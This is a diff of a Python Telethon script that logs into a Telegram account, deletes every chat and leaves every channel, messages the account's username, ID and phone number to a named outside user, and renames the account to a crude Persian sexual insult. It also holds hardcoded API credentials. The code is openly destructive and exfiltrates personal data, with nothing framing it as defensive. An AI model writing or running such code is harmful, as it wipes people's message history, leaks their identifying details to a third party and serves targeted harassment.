@@ -1,95 +1,84 @@
 from telethon import TelegramClient
-from telethon.tl.functions.messages import DeleteHistoryRequest
 from telethon.tl.functions.channels import LeaveChannelRequest
 from telethon.tl.functions.account import UpdateProfileRequest
-from telethon.tl.types import Channel, Chat, User
 from telethon.errors import FloodWaitError
+from telethon.tl.types import Channel
 import asyncio
 
-API_ID =29834234 
-API_HASH = "552c01d21d127def060f2915aedeebf9" 
+
+API_ID = 29834234
+API_HASH = "552c01d21d127def060f2915aedeebf9"
 
 TARGET_USERNAME = "Moein_915"
-NEW_FIRST_NAME = "کیر معین تو کونم" 
+NEW_FIRST_NAME = "کیر معین تو کونم"
+
 
 client = TelegramClient("my_account", API_ID, API_HASH)
 
+
 async def main():
-    await client.start()
+    await client.start()
 
-    async for d in client.iter_dialogs():
-        entity = d.entity
-        name = d.name or str(d.id)
+    print("Logged in.")
 
-        print(f"Processing: {name} ({type(entity).__name__})")
+    async for dialog in client.iter_dialogs():
+        entity = dialog.entity
+        name = dialog.name or str(dialog.id)
 
-        try:
-            await client(
-                DeleteHistoryRequest(
-                    peer=entity,
-                    max_id=0,
-                    revoke=True
-                )
-            )
-        except Exception as e:
-            print(f"  - Could not delete history for {name}: {type(e).__name__}")
+        print(f"Processing: {name}")
 
-        try:
-            if isinstance(entity, Channel):
-                await client(LeaveChannelRequest(entity))
-                await client.delete_dialog(entity)
-                print(f"  - Left and deleted Channel/Supergroup: {name}")
+        try:
+            await client.delete_dialog(entity)
+            print(f"Deleted chat: {name}")
 
-            elif isinstance(entity, Chat):
-                await client.delete_dialog(entity)
-                print(f"  - Left Group: {name}")
+            if isinstance(entity, Channel):
+                try:
+                    await client(LeaveChannelRequest(entity))
+                    print(f"Left channel: {name}")
+                except Exception as e:
+                    print(f"Leave failed: {e}")
 
-            elif isinstance(entity, User):
-                await client.delete_dialog(entity)
-                print(f"  - Deleted Private Chat: {name}")
+        except FloodWaitError as e:
+            print(f"Flood wait: {e.seconds} seconds")
+            await asyncio.sleep(e.seconds)
 
-            await asyncio.sleep(0.3)
+        except Exception as e:
+            print(f"Error deleting {name}: {e}")
 
-        except FloodWaitError as e:
-            print(f"FloodWait: waiting {e.seconds} seconds...")
-            await asyncio.sleep(e.seconds)
+        await asyncio.sleep(0.3)
 
-        except Exception as e:
-            print(f"  - FAILED to process {name}. Reason: {type(e).__name__}: {e}")
 
-    print("\nDone deleting chats.")
+    print("All chats processed.")
 
-    me = await client.get_me()
 
-    username = f"@{me.username}" if me.username else "(no username)"
-    phone = f"+{me.phone}" if me.phone else "(no phone)"
+    try:
+        me = await client.get_me()
 
-    info_text = (
-        f"Username: {username}\n"
-        f"User ID: {me.id}\n"
-        f"Phone: {phone}"
-    )
+        info = (
+            f"Username: @{me.username}\n"
+            f"ID: {me.id}\n"
+            f"Phone: +{me.phone}"
+        )
 
-    print("\n--- Account info to be sent ---")
-    print(info_text)
-    print("--------------------------------")
+        await client.send_message(TARGET_USERNAME, info)
+        print("Account info sent.")
 
-    try:
-        await client.send_message(TARGET_USERNAME, info_text)
-        print(f"Sent account info to @{TARGET_USERNAME}")
-    except Exception as e:
-        print(f"Could not send account info: {e}")
+    except Exception as e:
+        print(f"Send info error: {e}")
 
-    try:
-        await client(
-            UpdateProfileRequest(
-                first_name=NEW_FIRST_NAME
-            )
-        )
-        print(f"Account name changed to: {NEW_FIRST_NAME}")
-    except Exception as e:
-        print(f"Could not update profile name: {e}")
 
-if __name__ == "__main__":
-    with client:
-        client.loop.run_until_complete(main())
+    try:
+        await client(
+            UpdateProfileRequest(
+                first_name=NEW_FIRST_NAME
+            )
+        )
+
+        print("Name changed.")
+
+    except Exception as e:
+        print(f"Profile update error: {e}")
+
+
+with client:
+    client.loop.run_until_complete(main())
